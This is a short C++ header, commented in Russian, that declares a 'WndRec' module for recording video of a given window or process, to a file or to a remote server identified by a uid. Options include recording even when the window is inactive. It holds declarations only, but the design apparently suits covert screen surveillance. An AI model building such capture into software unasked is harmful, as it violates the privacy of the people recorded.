#pragma once

#include "manager.h"
#include "WndRec.h"

namespace WndRec
{

struct InOutData
{
	int typeIn; //0 - скриншоты hwnd, 1 - с pid
	int typeOut; //0 - запись в файл, 1 - запись в ip
	union
	{
		HWND hWnd;
		DWORD pid;
	};
	char* nameFile;
};

struct RecParam
{
	InOutData iod;
	char uid[128];
	union 
	{
		char nameVideo[64];
		char path[MAX_PATH];
	};
	int seconds;
	int flags;
	ServerData* server;
};

const int VIDEO_FULLSCREEN = 0x0001; //полноэкранная запись
const int VIDEO_ALWAYS	   = 0x0002; //записывать всегда, даже если окно не активно

const int MAX_VIDEO_SIZE = 50 * 1024 * 1024; //максимальный размер видео файла
const int MAX_VIDEO_FRAMES = 4 * 2 * 3600; //максимальное количество кадров в одном файле (~4 часа)
const int PERIOD_FIRST_FRAME = 2 * 60 * 3; //каждые 3 мин слать начальный кадр

//если server = 0, то пишет в файл nameVideo
void StartRecHwnd( ServerData* server, const char* uid, char* nameVideo, HWND wnd, int seconds, int flags );
void StartRecPid( ServerData* server, const char* uid, char* nameVideo, DWORD pid, int seconds, int flags );
void SendFirstFrame( ServerData* server );
void StopRec();

}
